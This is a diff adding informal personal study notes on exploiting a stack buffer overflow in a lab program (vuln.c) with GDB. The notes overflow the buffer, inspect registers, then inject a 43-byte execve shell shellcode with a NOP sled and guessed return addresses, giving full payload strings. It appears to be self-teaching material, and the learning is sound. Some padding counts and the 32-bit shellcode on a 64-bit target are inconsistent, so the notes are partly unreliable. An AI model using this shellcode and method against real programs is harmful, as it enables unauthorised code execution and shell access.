@@ -1,0 +1,68 @@
+write vuln.c
+to get usual bin:
+compile with $gcc vuln.c vuln
+
+to get gebug version:
+$gcc -g vuln.c (result a.out)
+
+use GDB (linux command line debugger)
+$gdb a.out
+
+(gdb)list - shows actual code  (decompile?)
+(gdb)disas main - shows asm of main f.
+
+
+next string allocating 500 of the buffer
+   0x0000000000001139 <+4>:     sub    $0x210,%rsp
+
+can run programm from gdb
+
+(gdb) run Hello
+exited normaly
+
+if pass more than 500 - seg fault:
+python can produce strings
+(gdb) run $(python2 -c 'print("\x41") * 506')
+message received:
+"Program received signal SIGSEGV, Segmentation fault.
+0x0000414141414141 in ?? ()"
+
+see RBP by:
+(gdb) info registers
+result
+"rbp            0x4141414141414141  0x4141414141414141"
+
+here the code was broken
+____________________________________________________________
+
+
+add payload and change RBP
+payload: (linux, intel) (43bytes)
+\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80
+it adds vars at the stack (or regs?) & exec syscall to tell it to run a shell
+old shell doesn't have protection
+
+so entire (but not final ) string is:
+run $(python2 -c 'print("\x41") * 526 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\x51"')
+
+\x51 is ret addr
+
+no op sled: (nop= \x90)  443 instead of 526 couse 43-payload, 40-retAddr
+run $(python2 -c 'print("\x90") * 443 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + ("\x51\x51\x51\x51") * 10')
+
+final string:
+run $(python2 -c 'print("\x90") * 423 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + ("\x00\xe7\xff\xff\xff\x7f") * 10')
+
+run $(python2 -c 'print("\x90") * 477 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + ("\xba\xe0\xff\xff\xff\x7f\x00\x00") * 1')
+
+
+
+to map memory (and see stack):
+info proc mapping
+
+
+DEFINE RIP (EIP): (run after segmentation fault!)
+(gdb) x/200xg $rsp
+or x/200xw $rsp-550
+pick addr at mid of x90s (like 7fffffffe660)
+
